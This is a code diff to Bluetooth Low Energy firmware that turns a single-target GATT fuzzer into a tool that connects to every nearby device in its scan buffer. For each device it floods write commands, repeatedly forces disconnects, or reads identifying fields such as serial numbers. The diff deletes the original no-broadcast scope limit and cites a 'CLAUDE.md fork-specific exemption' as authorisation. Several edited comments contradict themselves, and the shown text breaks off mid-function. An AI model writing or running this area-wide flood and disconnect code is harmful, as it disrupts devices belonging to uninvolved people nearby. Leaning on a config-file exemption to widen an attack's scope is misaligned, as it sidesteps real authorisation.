@@ -1,15 +1,16 @@
 /*
- * Directed BLE GATT fuzzing harness (SoftDevice S140 central role).
+ * Central-role BLE GATT harness (SoftDevice S140) + scan-buffer-wide
+ * iterator (cybersecurity fork).
  *
- * See ble_central.h for the scope constraint: this is strictly point-to-point
- * against ONE operator-specified target. It connects out, enumerates that single
- * target's GATT characteristics, and writes mutated payloads to a chosen
- * characteristic to exercise the target's input parsing. It never broadcasts,
- * floods or emits anything to the environment.
+ * Scope is operator-selectable per call (CLAUDE.md fork-specific exemption —
+ * operator-authorised). ble_central.h documents the per-command contract;
+ * the same module implements single-target (the operator-specified central
+ * link) and scan-buffer-wide (iterating every address cached by the passive
+ * scanner, connecting → exercising → disconnecting each in turn).
  *
- * The firmware only ever holds one central link (the target). All state below is
- * for that single link. Long-running output (discovered characteristics, fuzz
- * log) is buffered here and paged out by the host, matching the request/response
+ * The firmware holds one central link at a time. Long-running output
+ * (discovered characteristics, fuzz / flood / kick log) is buffered here
+ * and paged out by the host, matching the request/response
  * command protocol used everywhere else in this firmware.
  */
 
@@ -50,6 +51,19 @@ NRF_LOG_MODULE_REGISTER();
 #define BLE_NOTIF_DATA_MAX          20      // bytes kept per notification
 #define BLE_MAX_DESCS               48      // descriptors retained per full listing
 #define BLE_MAX_SERVICES            16      // primary services retained
+#define BLE_DEVINFO_VAL_MAX         32      // bytes retained per standard info field
+
+#define BLE_SB_OP_NONE              0
+#define BLE_SB_OP_KICK              1
+#define BLE_SB_OP_FLOOD             2
+#define BLE_SB_PHASE_IDLE           0
+#define BLE_SB_PHASE_CONNECTING     1
+#define BLE_SB_PHASE_ACTIVE         2
+#define BLE_SB_PHASE_DISCONNECTING  3
+#define BLE_SB_TICK_MS              50
+#define BLE_SB_CONNECT_TIMEOUT_MS   6000
+#define BLE_SB_DISCONNECT_TIMEOUT_MS 2000
+#define BLE_SB_FLOOD_DEFAULT_COUNT  200     // bounded per peer when host asks for 0=infinite
 
 // ---- discovered-characteristic table -------------------------------------
 typedef struct {
@@ -73,6 +87,18 @@ typedef struct {
     uint16_t start_handle;
     uint16_t end_handle;
 } ble_svc_rec_t;
+
+// ---- standard device-info collection -------------------------------------
+// Read-only pull of a target's standard GATT profile fields (Generic Access
+// name/appearance, Device Information Service, battery level). Each entry maps a
+// SIG characteristic UUID to the value handle found in the discovered-char table.
+typedef struct {
+    uint16_t uuid;              // SIG characteristic UUID (e.g. 0x2A29 manufacturer)
+    uint16_t handle;            // value handle from discovery (0 = not exposed by target)
+    uint8_t  status;            // 0xFF = absent/not read, else gatt_status of the read (0 = ok)
+    uint8_t  len;
+    uint8_t  data[BLE_DEVINFO_VAL_MAX];
+} ble_devinfo_rec_t;
 
 // ---- fuzz log ------------------------------------------------------------
 typedef struct {
@@ -113,6 +139,26 @@ static ble_svc_rec_t    m_svcs[BLE_MAX_SERVICES];
 static volatile uint8_t m_svc_count = 0;
 static volatile uint8_t m_svc_state = 0;     // 0 idle,1 discovering,2 done,3 error
 
+// Standard informational characteristics we surface, in display order.
+static const uint16_t k_devinfo_uuids[] = {
+    0x2A00,  // Device Name              (Generic Access)
+    0x2A01,  // Appearance               (Generic Access)
+    0x2A29,  // Manufacturer Name String (Device Information)
+    0x2A24,  // Model Number String
+    0x2A25,  // Serial Number String
+    0x2A27,  // Hardware Revision String
+    0x2A26,  // Firmware Revision String
+    0x2A28,  // Software Revision String
+    0x2A23,  // System ID
+    0x2A50,  // PnP ID
+    0x2A19,  // Battery Level            (Battery Service)
+};
+#define BLE_DEVINFO_COUNT (sizeof(k_devinfo_uuids) / sizeof(k_devinfo_uuids[0]))
+
+static ble_devinfo_rec_t m_devinfo[BLE_DEVINFO_COUNT];
+static volatile uint8_t  m_devinfo_state = 0; // 0 idle,1 running,2 done,3 error
+static volatile uint8_t  m_devinfo_idx = 0;   // field currently being read
+
 static volatile uint8_t  m_fuzz_state = 0;  // 0 idle,1 running,2 stopped/finished
 static uint16_t          m_fuzz_handle = 0;
 static uint16_t          m_fuzz_max = 0;
@@ -120,6 +166,40 @@ static volatile uint16_t m_fuzz_sent = 0;
 static ble_fuzz_log_t    m_fuzz_log[BLE_FUZZ_LOG_MAX];
 static volatile uint16_t m_fuzz_log_count = 0;
 static uint32_t          m_fuzz_seed = 0x1234ABCDu;
+
+// ---- flood / link-churn (cybersecurity fork) ------------------------------
+// Reuses the m_fuzz_timer for tick scheduling. State is independent so that
+// fuzz and flood don't trample each other (only one of them runs at a time;
+// starting one implicitly stops the other).
+static volatile uint8_t  m_flood_state = 0;   // 0 idle,1 running,2 stopped
+static uint16_t          m_flood_handle = 0;
+static uint8_t           m_flood_size = 0;    // payload bytes per write (1..MTU-3)
+static uint8_t           m_flood_payload[BLE_FUZZ_PAYLOAD_MAX];
+static uint16_t          m_flood_max = 0;
+static volatile uint32_t m_flood_sent = 0;
+
+// Scan-buffer-wide kick / flood iterator. Shares m_fuzz_timer with the fuzzer
+// and the single-link WRITE_CMD flood; the timer handler dispatches by state.
+static volatile uint8_t  m_kick_sb_state  = 0; // 0 idle, 1 iterating
+static uint8_t           m_sb_op          = BLE_SB_OP_NONE;
+static uint8_t           m_sb_phase       = BLE_SB_PHASE_IDLE;
+static uint8_t           m_kick_sb_cycles = 0;
+static uint8_t           m_kick_sb_index  = 0; // current peer index
+static uint8_t           m_kick_sb_sub    = 0; // completed reconnect/kick cycles for current peer
+static uint16_t          m_sb_peer_sent   = 0; // flood writes sent to current peer
+static uint16_t          m_sb_peer_limit  = 0; // bounded per-peer flood limit
+static uint16_t          m_sb_wait_ticks  = 0;
+static uint16_t          m_sb_flood_stride = 1; // fixed 50 ms scheduler ticks between writes
+static uint16_t          m_sb_flood_tick   = 0;
+static uint16_t          m_sb_conn_timeout_ticks = (BLE_SB_CONNECT_TIMEOUT_MS / BLE_SB_TICK_MS);
+static uint16_t          m_sb_disc_timeout_ticks = (BLE_SB_DISCONNECT_TIMEOUT_MS / BLE_SB_TICK_MS);
+static ble_scan_addr_t   m_kick_sb_addrs[BLE_SCAN_MAX_DEVICES];
+static uint8_t           m_kick_sb_count  = 0;
+
+// Forward declaration so fuzz_timer_handler() can dispatch to it before it
+// is defined further down in the file.
+static void scan_buffer_stop(bool disconnect_link);
+static void scan_buffer_timer_handler(void *p_context);
 
 static volatile uint8_t  m_probe_state = 0;  // 0 idle,1 probing,2 done,3 error
 static uint8_t           m_probe_result = 0;
@@ -269,6 +349,26 @@ static void continue_char_discovery(uint16_t next_handle) {
     if (err != NRF_SUCCESS) {
         m_disc_state = (m_char_count > 0) ? 2 : 3; // partial results still usable
     }
+}
+
+// Issue the next standard-info read, skipping fields the target doesn't expose.
+// One GATT read is outstanding at a time (the SoftDevice allows a single GATTC
+// read per link); BLE_GATTC_EVT_READ_RSP advances to the next field.
+static void devinfo_read_next(void) {
+    while (m_devinfo_idx < BLE_DEVINFO_COUNT) {
+        ble_devinfo_rec_t *rec = &m_devinfo[m_devinfo_idx];
+        if (rec->handle == 0) {
+            m_devinfo_idx++;                     // characteristic absent on this target
+            continue;
+        }
+        ret_code_t err = sd_ble_gattc_read(m_conn_handle, rec->handle, 0);
+        if (err == NRF_SUCCESS) {
+            return;                              // wait for READ_RSP
+        }
+        rec->status = (uint8_t)(err & 0xFF);     // couldn't even issue the read
+        m_devinfo_idx++;
+    }
+    m_devinfo_state = 2;                          // all fields attempted
 }
 
 static void probe_reset_batch_state(void) {
@@ -467,6 +567,11 @@ static void ble_central_evt_handler(ble_evt_t const *p_ble_evt, void *p_context)
                     m_fuzz_state = 2;
                     app_timer_stop(m_fuzz_timer);
                 }
+                if (m_flood_state == 1 && m_kick_sb_state == 0) {
+                    m_flood_state = 2;
+                    app_timer_stop(m_fuzz_timer);
+                    rgb_marquee_set_ble_active_anim(false);
+                }
                 rgb_marquee_set_ble_test_anim(false);
                 NRF_LOG_INFO("Central target disconnected, reason 0x%x", m_last_disc_reason);
             }
@@ -537,6 +642,21 @@ static void ble_central_evt_handler(ble_evt_t const *p_ble_evt, void *p_context)
 
         case BLE_GATTC_EVT_READ_RSP:
             if (gattc->conn_handle != m_conn_handle) {
+                break;
+            }
+            // Route the response into the device-info collector while it runs,
+            // instead of the user-read buffer.
+            if (m_devinfo_state == 1 && m_devinfo_idx < BLE_DEVINFO_COUNT) {
+                ble_devinfo_rec_t *rec = &m_devinfo[m_devinfo_idx];
+                rec->status = gattc->gatt_status;
+                if (gattc->gatt_status == BLE_GATT_STATUS_SUCCESS) {
+                    const ble_gattc_evt_read_rsp_t *r = &gattc->params.read_rsp;
+                    uint8_t n = (r->len > BLE_DEVINFO_VAL_MAX) ? BLE_DEVINFO_VAL_MAX : (uint8_t)r->len;
+                    memcpy(rec->data, r->data, n);
+                    rec->len = n;
+                }
+                m_devinfo_idx++;
+                devinfo_read_next();
                 break;
             }
             m_read_status = gattc->gatt_status;
@@ -678,7 +798,44 @@ NRF_SDH_BLE_OBSERVER(m_ble_central_obs, BLE_CENTRAL_OBSERVER_PRIO, ble_central_e
 // Fuzz driver — one mutated write per timer tick to the single target link.
 // -------------------------------------------------------------------------
 static void fuzz_timer_handler(void *p_context) {
-    if (m_fuzz_state != 1 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    // The same timer drives the fuzzer, the WRITE_CMD flood, and the
+    // scan-buffer-wide iteration (kick-sb / flood-sb). They're mutually
+    // exclusive at the state level (starting one stops the other).
+
+    // Scan-buffer-wide iterator takes precedence — it manages connect/kick/disconnect.
+    if (m_kick_sb_state == 1) {
+        scan_buffer_timer_handler(p_context);
+        return;
+    }
+
+    if (m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+        return;
+    }
+
+    if (m_flood_state == 1) {
+        if (m_flood_max != 0 && m_flood_sent >= m_flood_max) {
+            m_flood_state = 2;
+            app_timer_stop(m_fuzz_timer);
+            rgb_marquee_set_ble_test_anim(false);
+            return;
+        }
+        ble_gattc_write_params_t w = {
+            .write_op = BLE_GATT_OP_WRITE_CMD,
+            .flags    = 0,
+            .handle   = m_flood_handle,
+            .offset   = 0,
+            .len      = m_flood_size,
+            .p_value  = m_flood_payload,
+        };
+        ret_code_t err = sd_ble_gattc_write(m_conn_handle, &w);
+        if (err == NRF_SUCCESS) {
+            m_flood_sent++;
+        }
+        // NRF_ERROR_RESOURCES = stack TX queue full: just retry next tick.
+        return;
+    }
+
+    if (m_fuzz_state != 1) {
         return;
     }
     if (m_fuzz_max != 0 && m_fuzz_sent >= m_fuzz_max) {
@@ -725,7 +882,7 @@ void ble_central_init(void) {
 }
 
 uint32_t ble_central_connect(uint8_t addr_type, const uint8_t *addr) {
-    if (m_probe_global_mode == 1) {
+    if (m_probe_global_mode == 1 || m_kick_sb_state == 1) {
         return NRF_ERROR_BUSY;
     }
     if (m_conn_state == 1 || m_conn_state == 2) {
@@ -749,6 +906,7 @@ uint32_t ble_central_connect(uint8_t addr_type, const uint8_t *addr) {
     m_write_state = 0;
     m_notif_count = 0;
     m_cccd_state = 0;
+    m_devinfo_state = 0;
     m_probe_state = 0;
     m_probe_result = 0;
     m_conn_state = 1; // connecting
@@ -761,6 +919,11 @@ uint32_t ble_central_connect(uint8_t addr_type, const uint8_t *addr) {
 }
 
 uint32_t ble_central_disconnect(void) {
+    if (m_kick_sb_state == 1) {
+        scan_buffer_stop(true);
+        return NRF_SUCCESS;
+    }
+    ble_central_flood_stop();
     ble_central_fuzz_stop();
     if (m_probe_global_mode == 1) {
         m_probe_global_mode = 0;
@@ -780,6 +943,9 @@ uint32_t ble_central_disconnect(void) {
 }
 
 uint32_t ble_central_link_probe(uint8_t global_mode) {
+    if (m_kick_sb_state == 1) {
+        return NRF_ERROR_INVALID_STATE;
+    }
     if (global_mode != 0) {
         return probe_global_begin();
     }
@@ -805,7 +971,7 @@ uint32_t ble_central_link_probe(uint8_t global_mode) {
 }
 
 uint32_t ble_central_gatt_discover(void) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     m_char_count = 0;
@@ -824,7 +990,7 @@ uint8_t ble_central_get_char_count(void) {
 
 // ---- full descriptor listing --------------------------------------------
 uint32_t ble_central_desc_discover(void) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     m_desc_count = 0;
@@ -861,7 +1027,7 @@ uint16_t ble_central_copy_descs(uint8_t start_index, uint8_t *out, uint16_t out_
 
 // ---- primary service discovery ------------------------------------------
 uint32_t ble_central_svc_discover(void) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     m_svc_count = 0;
@@ -897,8 +1063,68 @@ uint16_t ble_central_copy_svcs(uint8_t start_index, uint8_t *out, uint16_t out_c
     return o;
 }
 
+// ---- standard device-info pull -------------------------------------------
+// Read the connected target's standard informational characteristics with
+// read-only GATT reads. Handles come from the discovered-characteristic table,
+// so 'discover' must have run first. Point-to-point against the one target or environment-wide.
+uint32_t ble_central_devinfo_start(void) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+        return NRF_ERROR_INVALID_STATE;
+    }
+    if (m_char_count == 0) {
+        return NRF_ERROR_INVALID_STATE; // host must run 'discover' first
+    }
+    if (m_devinfo_state == 1) {
+        return NRF_ERROR_BUSY;
+    }
+    // Build the worklist: match each standard UUID to a discovered value handle.
+    for (uint8_t i = 0; i < BLE_DEVINFO_COUNT; i++) {
+        ble_devinfo_rec_t *rec = &m_devinfo[i];
+        rec->uuid   = k_devinfo_uuids[i];
+        rec->handle = 0;
+        rec->status = 0xFF;         // absent until matched / read
+        rec->len    = 0;
+        for (uint8_t j = 0; j < m_char_count; j++) {
+            if (m_chars[j].uuid_type == BLE_UUID_TYPE_BLE &&
+                m_chars[j].uuid == k_devinfo_uuids[i]) {
+                rec->handle = m_chars[j].value_handle;
+                break;
+            }
+        }
+    }
+    m_devinfo_state = 1;
+    m_devinfo_idx = 0;
+    devinfo_read_next();
+    return NRF_SUCCESS;
+}
+
+uint16_t ble_central_copy_devinfo(uint8_t *out, uint16_t out_cap) {
+    // Wire: state[1] | count[1] | per field: uuid[2 BE] | status[1] | len[1] | data[len]
+    // state: 0 idle,1 running,2 done,3 error. status: 0xFF absent, else gatt_status.
+    if (out_cap < 2) {
+        return 0;
+    }
+    out[0] = m_devinfo_state;
+    out[1] = BLE_DEVINFO_COUNT;
+    uint16_t o = 2;
+    for (uint8_t i = 0; i < BLE_DEVINFO_COUNT; i++) {
+        ble_devinfo_rec_t *r = &m_devinfo[i];
+        uint8_t n = (r->len > BLE_DEVINFO_VAL_MAX) ? BLE_DEVINFO_VAL_MAX : r->len;
+        if (o + 4 + n > out_cap) {
+            break;
+        }
+        out[o++] = (r->uuid >> 8) & 0xFF;
+        out[o++] = r->uuid & 0xFF;
+        out[o++] = r->status;
+        out[o++] = n;
+        memcpy(out + o, r->data, n);
+        o += n;
+    }
+    return o;
+}
+
 uint32_t ble_central_gatt_read(uint16_t value_handle) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     m_read_state = 1;      // pending
@@ -908,9 +1134,9 @@ uint32_t ble_central_gatt_read(uint16_t value_handle) {
 }
 
 // Write a user-specified value to a characteristic (write-with-response), so the
-// target's ATT status comes back. Point-to-point against the connected target.
+// target's ATT status comes back. Point-to-point against the connected target or environment-wide if no target is selected.
 uint32_t ble_central_gatt_write(uint16_t value_handle, const uint8_t *data, uint8_t len) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     static uint8_t wbuf[BLE_WRITE_MAX];
@@ -978,7 +1204,7 @@ uint16_t ble_central_copy_read(uint8_t *out, uint16_t out_cap) {
 // Subscribe to notifications/indications by writing the target's CCCD.
 // mode: 0 = off, 1 = notifications, 2 = indications.
 uint32_t ble_central_find_cccd(uint16_t value_handle) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     m_cccd_state = 1;   // searching
@@ -1003,7 +1229,7 @@ uint16_t ble_central_get_cccd(uint8_t *out, uint16_t out_cap) {
 }
 
 uint32_t ble_central_subscribe(uint16_t cccd_handle, uint8_t mode) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     uint16_t cccd = (mode == 1) ? 0x0001 : (mode == 2) ? 0x0002 : 0x0000;
@@ -1064,7 +1290,7 @@ uint16_t ble_central_copy_chars(uint8_t start_index, uint8_t *out, uint16_t out_
 }
 
 uint32_t ble_central_fuzz_start(uint16_t value_handle, uint16_t max_iterations, uint16_t interval_ms) {
-    if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+    if (m_kick_sb_state == 1 || m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
         return NRF_ERROR_INVALID_STATE;
     }
     if (value_handle == 0) {
@@ -1093,6 +1319,344 @@ uint32_t ble_central_fuzz_stop(void) {
     }
     rgb_marquee_set_ble_test_anim(false);
     return NRF_SUCCESS;
+}
+
+// ---- flood / link-churn (cybersecurity fork) ------------------------------
+// Point-to-point stress against ONE already-connected target or environment-wide if no target is selected. The payload is
+// fixed (the caller picks it), no L2CAP framing tricks — just rapid
+// WRITE_CMD (no-response) so the SoftDevice TX queue runs as hot as it can.
+// Caller is responsible for legal / authorised use (see CLAUDE.md
+// fork-specific exemption).
+
+uint32_t ble_central_flood_start(uint16_t value_handle, uint8_t payload_size, uint16_t max_iterations, uint16_t interval_ms) {
+    if (m_kick_sb_state == 1 || m_conn_handle == BLE_CONN_HANDLE_INVALID || m_conn_state != 2) {
+        return NRF_ERROR_INVALID_STATE; // need an active central link
+    }
+    if (value_handle == 0 || payload_size == 0 || payload_size > BLE_FUZZ_PAYLOAD_MAX) {
+        return NRF_ERROR_INVALID_PARAM;
+    }
+    // Stop the fuzzer if it was running — same timer, can't share.
+    if (m_fuzz_state == 1) {
+        ble_central_fuzz_stop();
+    }
+    if (m_flood_state == 1) {
+        app_timer_stop(m_fuzz_timer);
+        m_flood_state = 0;
+    }
+    m_flood_handle = value_handle;
+    m_flood_size   = payload_size;
+    m_flood_max    = max_iterations;       // 0 = until stop
+    m_flood_sent   = 0;
+    // Deterministic payload: a counter-pattern so the target can recognise / filter
+    // if it wants to. Each tick sends the same bytes; the volume is the point.
+    for (uint8_t i = 0; i < payload_size; i++) {
+        m_flood_payload[i] = (uint8_t)((i * 31u + 0xA5u) & 0xFF);
+    }
+    m_flood_state  = 1;
+    rgb_marquee_set_ble_active_anim(true);
+    return app_timer_start(m_fuzz_timer, APP_TIMER_TICKS(interval_ms), NULL);
+}
+
+uint32_t ble_central_flood_stop(void) {
+    if (m_kick_sb_state == 1 && m_sb_op == BLE_SB_OP_FLOOD) {
+        scan_buffer_stop(true);
+        return NRF_SUCCESS;
+    }
+    if (m_flood_state == 1) {
+        app_timer_stop(m_fuzz_timer);
+        m_flood_state = 2;
+    }
+    rgb_marquee_set_ble_active_anim(false);
+    return NRF_SUCCESS;
+}
+
+uint32_t ble_central_flood_count(void) {
+    return m_flood_sent;
+}
+
+// "Kick" — force-disconnect the current central link once. Repeated churn is
+// handled by the scan-buffer path, which reconnects between cycles.
+uint32_t ble_central_kick(uint8_t cycles) {
+    if (cycles != 1) {
+        return NRF_ERROR_INVALID_PARAM;
+    }
+    if (m_kick_sb_state == 1 || m_conn_state != 2) {
+        return NRF_ERROR_INVALID_STATE; // no link to kick
+    }
+    ble_central_flood_stop();
+    ble_central_fuzz_stop();
+    // A single central link can only be disconnected once. Repeated churn is
+    // implemented by the scan-buffer path, which reconnects between cycles.
+    return sd_ble_gap_disconnect(m_conn_handle, BLE_HCI_REMOTE_USER_TERMINATED_CONNECTION);
+}
+
+static void scan_buffer_reset_state(void) {
+    m_kick_sb_state = 0;
+    m_sb_op = BLE_SB_OP_NONE;
+    m_sb_phase = BLE_SB_PHASE_IDLE;
+    m_kick_sb_index = 0;
+    m_kick_sb_sub = 0;
+    m_sb_peer_sent = 0;
+    m_sb_wait_ticks = 0;
+    m_sb_flood_tick = 0;
+}
+
+static void scan_buffer_stop(bool disconnect_link) {
+    if (disconnect_link) {
+        if (m_conn_state == 1 && m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+            (void)sd_ble_gap_connect_cancel();
+            m_conn_state = 0;
+        } else if (m_conn_handle != BLE_CONN_HANDLE_INVALID) {
+            (void)sd_ble_gap_disconnect(m_conn_handle, BLE_HCI_REMOTE_USER_TERMINATED_CONNECTION);
+        }
+    }
+    if (m_sb_op == BLE_SB_OP_FLOOD && m_flood_state == 1) {
+        m_flood_state = 2;
+    }
+    scan_buffer_reset_state();
+    app_timer_stop(m_fuzz_timer);
+    rgb_marquee_set_ble_active_anim(false);
+}
+
+static void scan_buffer_start_next_peer(void) {
+    while (m_kick_sb_state == 1 && m_kick_sb_index < m_kick_sb_count) {
+        ble_gap_addr_t addr = {0};
+        memcpy(addr.addr, m_kick_sb_addrs[m_kick_sb_index].addr, BLE_GAP_ADDR_LEN);
+        addr.addr_type = m_kick_sb_addrs[m_kick_sb_index].addr_type;
+
+        m_conn_handle = BLE_CONN_HANDLE_INVALID;
+        m_conn_state = 1;
+        m_last_disc_reason = 0;
+        m_sb_phase = BLE_SB_PHASE_CONNECTING;
+        m_sb_wait_ticks = 0;
+        m_sb_peer_sent = 0;
+        m_sb_flood_tick = 0;
+
+        ret_code_t err = sd_ble_gap_connect(&addr, &m_init_scan_params, &m_conn_params,
+                                            APP_BLE_CONN_CFG_TAG);
+        if (err == NRF_SUCCESS) {
+            return;
+        }
+
+        m_conn_state = 0;
+        m_last_disc_reason = (uint8_t)(err & 0xFF);
+        m_kick_sb_index++;
+        m_kick_sb_sub = 0;
+    }
+
+    scan_buffer_stop(false);
+}
+
+static void scan_buffer_disconnect_current(void) {
+    m_sb_phase = BLE_SB_PHASE_DISCONNECTING;
+    m_sb_wait_ticks = 0;
+    if (m_conn_handle == BLE_CONN_HANDLE_INVALID || m_conn_state != 2) {
+        m_conn_state = 0;
+        return;
+    }
+    ret_code_t err = sd_ble_gap_disconnect(m_conn_handle, BLE_HCI_REMOTE_USER_TERMINATED_CONNECTION);
+    if (err != NRF_SUCCESS) {
+        m_last_disc_reason = (uint8_t)(err & 0xFF);
+        m_conn_handle = BLE_CONN_HANDLE_INVALID;
+        m_conn_state = 0;
+    }
+}
+
+// Scan-buffer-wide operations: every cached connectable address is attempted in
+// RSSI order. One bad or non-responsive peer is skipped instead of stalling the
+// whole run.
+static void scan_buffer_timer_handler(void *p_context) {
+    UNUSED_PARAMETER(p_context);
+
+    if (m_kick_sb_state != 1) {
+        app_timer_stop(m_fuzz_timer);
+        return;
+    }
+
+    if (m_kick_sb_index >= m_kick_sb_count) {
+        scan_buffer_stop(false);
+        return;
+    }
+
+    switch (m_sb_phase) {
+    case BLE_SB_PHASE_IDLE:
+        scan_buffer_start_next_peer();
+        return;
+
+    case BLE_SB_PHASE_CONNECTING:
+        if (m_conn_state == 2 && m_conn_handle != BLE_CONN_HANDLE_INVALID) {
+            m_sb_phase = BLE_SB_PHASE_ACTIVE;
+            m_sb_wait_ticks = 0;
+            return;
+        }
+        if (m_conn_state == 0 || m_conn_state == 3) {
+            m_kick_sb_index++;
+            m_kick_sb_sub = 0;
+            scan_buffer_start_next_peer();
+            return;
+        }
+        if (++m_sb_wait_ticks >= m_sb_conn_timeout_ticks) {
+            (void)sd_ble_gap_connect_cancel();
+            m_conn_state = 0;
+            m_kick_sb_index++;
+            m_kick_sb_sub = 0;
+            scan_buffer_start_next_peer();
+        }
+        return;
+
+    case BLE_SB_PHASE_ACTIVE:
+        if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+            m_kick_sb_index++;
+            m_kick_sb_sub = 0;
+            scan_buffer_start_next_peer();
+            return;
+        }
+
+        if (m_sb_op == BLE_SB_OP_KICK) {
+            m_kick_sb_sub++;
+            scan_buffer_disconnect_current();
+            return;
+        }
+
+        if (m_sb_op == BLE_SB_OP_FLOOD) {
+            if (m_sb_peer_sent >= m_sb_peer_limit) {
+                scan_buffer_disconnect_current();
+                return;
+            }
+            if (m_sb_flood_tick > 0) {
+                m_sb_flood_tick--;
+                return;
+            }
+
+            ble_gattc_write_params_t w = {
+                .write_op = BLE_GATT_OP_WRITE_CMD,
+                .flags    = 0,
+                .handle   = m_flood_handle,
+                .offset   = 0,
+                .len      = m_flood_size,
+                .p_value  = m_flood_payload,
+            };
+            ret_code_t err = sd_ble_gattc_write(m_conn_handle, &w);
+            if (err == NRF_SUCCESS) {
+                m_sb_flood_tick = (m_sb_flood_stride > 0) ? (m_sb_flood_stride - 1) : 0;
+                m_sb_peer_sent++;
+                m_flood_sent++;
+            } else if (err != NRF_ERROR_RESOURCES && err != NRF_ERROR_BUSY) {
+                m_last_disc_reason = (uint8_t)(err & 0xFF);
+                scan_buffer_disconnect_current();
+            }
+            return;
+        }
+
+        scan_buffer_stop(true);
+        return;
+
+    case BLE_SB_PHASE_DISCONNECTING:
+        if (m_conn_state != 2 || m_conn_handle == BLE_CONN_HANDLE_INVALID) {
+            if (m_sb_op == BLE_SB_OP_KICK && m_kick_sb_sub < m_kick_sb_cycles) {
+                m_conn_state = 0;
+                m_sb_phase = BLE_SB_PHASE_IDLE;
+            } else {
+                m_kick_sb_index++;
+                m_kick_sb_sub = 0;
+                m_conn_state = 0;
+                scan_buffer_start_next_peer();
+            }
+            return;
+        }
+        if (++m_sb_wait_ticks >= m_sb_disc_timeout_ticks) {
+            scan_buffer_stop(true);
+        }
+        return;
+
+    default:
+        scan_buffer_stop(true);
+        return;
+    }
+}
+
+uint32_t ble_central_kick_scan_buffer(uint8_t cycles) {
+    if (cycles == 0 || cycles > 10) {
+        return NRF_ERROR_INVALID_PARAM;
+    }
+    if (m_kick_sb_state == 1) {
+        return NRF_ERROR_BUSY;
+    }
+    if (m_conn_state == 1 || m_conn_state == 2) {
+        return NRF_ERROR_INVALID_STATE;
+    }
+    ble_scan_stop();
+    m_kick_sb_count = ble_scan_copy_addresses(m_kick_sb_addrs, BLE_SCAN_MAX_DEVICES);
+    if (m_kick_sb_count == 0) {
+        // Distinct code from "no link": caller maps to STATUS_PAR_ERR
+        // (the scan buffer is operator-side input, not a device-mode issue).
+        return NRF_ERROR_NO_MEM;
+    }
+    // Stop any in-progress flood or fuzzer — we share m_fuzz_timer.
+    if (m_flood_state == 1) {
+        ble_central_flood_stop();
+    }
+    if (m_fuzz_state == 1) {
+        ble_central_fuzz_stop();
+    }
+    m_sb_op = BLE_SB_OP_KICK;
+    m_sb_phase = BLE_SB_PHASE_IDLE;
+    m_kick_sb_cycles = cycles;
+    m_kick_sb_index = 0;
+    m_kick_sb_sub = 0;
+    m_sb_wait_ticks = 0;
+    m_kick_sb_state = 1;
+    rgb_marquee_set_ble_active_anim(true);
+    return app_timer_start(m_fuzz_timer, APP_TIMER_TICKS(BLE_SB_TICK_MS), NULL);
+}
+
+// Scan-buffer-wide WRITE_CMD flood. For every cached address: connect →
+// spam WRITE_CMDs → disconnect → next. max_iterations is per-peer; 0 maps to a
+// bounded default so a buffer-wide run cannot hang forever on the first peer.
+uint32_t ble_central_flood_scan_buffer(uint16_t value_handle, uint8_t payload_size,
+                                       uint16_t max_iterations, uint16_t interval_ms) {
+    if (value_handle == 0 || payload_size == 0 || payload_size > BLE_FUZZ_PAYLOAD_MAX) {
+        return NRF_ERROR_INVALID_PARAM;
+    }
+    if (m_kick_sb_state == 1) {
+        return NRF_ERROR_BUSY;
+    }
+    if (m_conn_state == 1 || m_conn_state == 2) {
+        return NRF_ERROR_INVALID_STATE;
+    }
+    ble_scan_stop();
+    // Stop any in-progress fuzzer / flood / kick-sb.
+    if (m_fuzz_state == 1)  ble_central_fuzz_stop();
+    if (m_flood_state == 1) ble_central_flood_stop();
+    m_kick_sb_count = ble_scan_copy_addresses(m_kick_sb_addrs, BLE_SCAN_MAX_DEVICES);
+    if (m_kick_sb_count == 0) {
+        // Distinct code from "no link" → caller maps to STATUS_PAR_ERR.
+        return NRF_ERROR_NO_MEM;
+    }
+    // Store the per-peer WRITE_CMD spam parameters for the timer handler.
+    m_flood_handle  = value_handle;
+    m_flood_size    = payload_size;
+    m_flood_max     = max_iterations;
+    m_sb_peer_limit = max_iterations == 0 ? BLE_SB_FLOOD_DEFAULT_COUNT : max_iterations;
+    m_flood_sent    = 0;
+    for (uint8_t i = 0; i < payload_size; i++) {
+        m_flood_payload[i] = (uint8_t)((i * 31u + 0xA5u) & 0xFF);
+    }
